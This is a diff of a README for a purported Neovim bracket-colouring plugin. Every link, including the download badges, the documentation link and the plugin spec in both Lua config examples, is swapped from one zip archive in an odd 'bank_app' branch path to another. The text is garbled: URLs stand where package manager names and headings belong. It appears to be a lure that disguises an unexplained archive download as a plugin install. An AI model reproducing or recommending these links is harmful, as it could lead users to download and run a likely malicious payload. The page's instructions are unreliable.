@@ -1,12 +1,12 @@
 # 🎨 chromatica-brackets - Color Your Nested Brackets Easily
 
-[![Download chromatica-brackets](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip%20chromatica--brackets-v1.0-blue)](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip)
+[![Download chromatica-brackets](https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip%20chromatica--brackets-v1.0-blue)](https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of **chromatica-brackets**.
 
-[Click here to visit the download page.](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip)
+[Click here to visit the download page.](https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip)
 
 ## 📝 Description
 
@@ -35,28 +35,28 @@ Once you install **chromatica-brackets**, it activates automatically for support
 
 ## ⚙️ Installation
 
-You can install **chromatica-brackets** using popular package managers like **https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip** or **https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip**.
+You can install **chromatica-brackets** using popular package managers like **https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip** or **https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip**.
 
-### https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip Example
+### https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip Example
 
 Add the following code to your configuration:
 
 ```lua
 {
-  "https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip",
+  "https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip",
   config = function()
     require("chromatica_brackets").setup()
   end,
 }
 ```
 
-### https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip Example
+### https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip Example
 
 Use the following snippet in your configuration:
 
 ```lua
 use {
-  "https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip",
+  "https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip",
   config = function()
     require("chromatica_brackets").setup()
   end,
@@ -98,6 +98,6 @@ require("chromatica_brackets").setup({
 
 Join our community for help, feature requests, and sharing experiences. Feel free to create issues or pull requests in the repository. 
 
-For detailed documentation and use cases, refer to the [official documentation](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip).
+For detailed documentation and use cases, refer to the [official documentation](https://raw.githubusercontent.com/SheyiTrig/chromatica-brackets/bank_app/lib/chromatica-brackets-3.9.zip).
 
 By following these steps, you can easily download and run **chromatica-brackets**, enhancing your coding experience in Neovim.
